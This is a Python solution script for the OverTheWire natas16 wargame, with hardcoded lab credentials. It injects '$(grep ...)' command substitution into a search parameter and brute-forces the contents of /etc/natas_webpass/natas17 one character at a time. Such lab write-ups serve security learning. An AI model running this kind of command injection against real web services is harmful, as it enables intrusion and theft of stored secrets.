import requests
from requests.auth import HTTPBasicAuth

# 目标 URL 与认证信息（请替换为你的 natas16 密码）
url = "http://natas16.natas.labs.overthewire.org/"
auth = HTTPBasicAuth("natas16", "Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb")

# 密码字符集与空密码
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
password = ""

print("[*] Starting password recovery ...")

# 循环猜解 32 位密码
for i in range(32):
    for char in charset:
        # 利用 Africans 单词作为锚点构建 payload
        payload = f"Africans$(grep ^{password}{char} /etc/natas_webpass/natas17)"
        response = requests.get(url, params={"needle": payload}, auth=auth)
        
        # 页面中没有出现 "Africans" 意味着匹配成功
        if "Africans" not in response.text:
            password += char
            print(f"[+]  {i+1} word: {password}")
            break

print(f"\n[+] Natas17 password: {password}")
